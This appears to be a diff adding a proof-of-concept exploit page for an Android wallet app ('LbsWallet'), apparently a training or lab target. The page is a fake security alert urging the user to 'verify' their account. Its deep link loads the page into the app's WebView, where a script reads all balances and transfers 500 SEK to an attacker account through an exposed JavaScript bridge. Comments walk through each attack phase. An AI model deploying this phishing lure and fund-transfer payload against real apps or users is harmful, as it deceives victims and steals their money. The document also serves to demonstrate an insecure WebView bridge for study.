@@ -1,0 +1,81 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>LbsWallet Security Alert</title>
+  <style>
+    body { font-family: system-ui, -apple-system, Segoe UI, Roboto, sans-serif; margin: 28px; color: #111827; }
+    .card { max-width: 520px; border: 1px solid #e5e7eb; border-radius: 12px; padding: 18px; }
+    h2 { margin: 0 0 8px; }
+    p  { margin: 0 0 14px; line-height: 1.4; }
+    .cta  { display: inline-block; padding: 10px 14px; border-radius: 10px;
+            text-decoration: none; border: 1px solid #111827;
+            color: #111827; font-weight: 700; }
+    .fine { margin-top: 12px; font-size: 12px; color: #6b7280; }
+    #output { margin-top: 14px; padding: 10px; background: #f3f4f6;
+              border-radius: 8px; font-size: 13px; word-break: break-all; }
+  </style>
+  <script>
+    /*
+     * ATTACK LOGIC
+     * ============
+     * Phase 1 (Chrome): User opens http://127.0.0.1:8000/support.html in Chrome.
+     *   WalletBridge is NOT available here — this is a normal browser page.
+     *   The "Verify account" link contains the deep link:
+     *     lbswallet://webview?url=http://127.0.0.1:8000/support.html
+     *   Clicking it triggers Android to open WalletActivity via the
+     *   registered <intent-filter> for scheme="lbswallet" host="webview".
+     *
+     * Phase 2 (WebView): WalletActivity calls
+     *   webView.loadUrl(getIntent().getData().getQueryParameter("url"))
+     *   which loads THIS file again — now inside the WalletActivity WebView.
+     *   WalletBridge was attached unconditionally in onCreate():
+     *     webView.addJavascriptInterface(new WalletBridge(), "WalletBridge")
+     *   so it is available on any URL the WebView loads.
+     *
+     * Phase 3 (exploit): The load-event handler calls WalletBridge methods
+     *   to read balances and transfer funds.
+     */
+    window.addEventListener('load', function () {
+      if (!window.WalletBridge) {
+        // Still in Chrome — nothing to do; user must click the deep link.
+        return;
+      }
+
+      // ── 1. Exfiltrate balances ──────────────────────────────────────────
+      var balances = window.WalletBridge.getAllBalances();   // returns JSON string
+
+      // ── 2. Transfer funds ───────────────────────────────────────────────
+      // Transfer 500 SEK from user1 to user2 (attacker's account)
+      var transferResult = window.WalletBridge.transfer('user1', 'user2', '500');
+
+      // Show results on the page (in a real attack this would be exfiltrated
+      // to an attacker-controlled server via fetch/XMLHttpRequest)
+      document.getElementById('output').textContent =
+        'Balances: ' + balances + '\nTransfer result: ' + transferResult;
+    });
+  </script>
+</head>
+<body>
+  <div class="card">
+    <h2>Important: lbs Wallet Security Alert</h2>
+    <p>We detected unusual activity on your account. Please review and verify your account now.</p>
+
+    <!--
+      EXPLOIT LINK
+      The href value is the deep link that injects this page's URL into the WebView.
+      When the user taps this link in Chrome, Android resolves the lbswallet:// scheme,
+      opens WalletActivity, and WalletActivity calls:
+        webView.loadUrl("http://127.0.0.1:8000/support.html")
+      — loading this page inside the privileged WebView context where WalletBridge is attached.
+    -->
+    <a class="cta" href="lbswallet://webview?url=http://127.0.0.1:8000/support.html">
+      Verify account
+    </a>
+
+    <div id="output"></div>
+    <p class="fine">lbs Wallet &bull; Security Operations</p>
+  </div>
+</body>
+</html>
